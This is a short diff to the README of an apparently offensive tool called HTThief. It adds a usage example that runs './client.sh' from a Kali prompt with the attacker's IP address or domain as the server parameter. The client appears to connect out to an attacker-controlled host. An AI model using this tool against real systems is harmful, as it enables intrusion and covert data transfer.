@@ -56,6 +56,13 @@ That way, even if there is some soul that decodes during tracing, this piece of 
 
 # Usage
 
+The use of HTThief is simple:
+
+```
+kali@kali:~ ./client.sh --ip <HTThief_Server_IP>
+```
+
+You can replace the parameter for attacker IP address or attacker domain, wherever.
 
 
 # Tutorial
